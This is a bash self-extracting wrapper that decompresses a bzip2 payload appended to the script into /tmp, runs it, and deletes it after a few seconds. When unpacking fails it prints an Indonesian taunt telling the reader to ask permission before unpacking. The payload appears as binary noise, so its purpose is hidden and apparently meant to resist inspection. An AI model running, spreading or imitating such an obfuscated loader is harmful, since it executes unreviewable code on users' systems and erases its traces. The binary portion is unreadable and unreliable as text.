#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��6 V��e����?�������@D@  P��w��^�J�zh %C5=	�F�4M4�4ɦ��@44 �2��OSI�D��FCA���& d�4Ѧ��5)�� F�0�2i��ɐ�	��L&$���
zO��@i�i�S��h�Ѡ�Fр&�$���&B=P�4�LFA����4z��=S@\r��A
e����"�|� �e�4!���U���ߟ��(k�M�+��V'�`QL���P:�p�@��n�J�|�抉�='�vqV#�(k.=��4���K���>ęu�؊q`Zz�=c�L�&+į|� ���8g�Ƞ�8�;h�.�ѩ�[��7�b�E9Jw:M8!"<rv�7:};w�	xee�)Z3��'=��i�3mt[�q��@͗yPu_$J2XD�����@�$�C	]����p�����_y�� =�̰���h򉒖U��O�`�:��&B�Y"t׷�j5ܶ\ �/k��wk��A�(DTI�!�%���v*ԩV�Ȝ�HYDоDӘa':�����4g�y�{���yG�����]Q s�\Pn������L��b𼿯�d\H� l�⎱@*
 1��I$�DR�'����v��MB!y{�(�ޖ
sl]	�?p�h	�����&�y��q���͞��b�t/ߩu�zn�F~t<��}"������Z�`Z?K��⪟!#ny	��F� ���-	>��(��U"�4��V�S7�t���IW&��m��fW�Asӄ EA`-�W:Ns��4Vt>uT�� Ԏm�P���D�! o�F�l��@A���د����Jw�W`�pѝ�~��K>9���6eV�}�6u���ӹ��V[8���������1�,�E)��{�
;��t�SE������.-���
Ġ^�
9R����,�y������DS�p򪙧�=����ӈC� ��%��Tlv�D�v��rc�H*H,"��>�IV�C��pm�rR��"�`|�V5�jKP�k=Y�m>G��(�85�@�\��8&H@`b�p2d�gk��@Y���x�@�7� %Ǧ�(d�b7H��-�U�q��yt�}�"��LyݯN",Hޝ����<�7e�\��$69'�&V��Q�Z����ɐέ�Yf�l�4���#���m��6j�r|�� ��� )/��7*�(�Z3����1�W�:��N�9{e���� Z�*�DȢbP��׽��C�:rD�
(�7B�78��T���yx���)y+6K�(����� -.@y��(rVTM�e������D��E�_�!T@�
�AS���)�� \J4�R���,@"�T��w$S�	`�`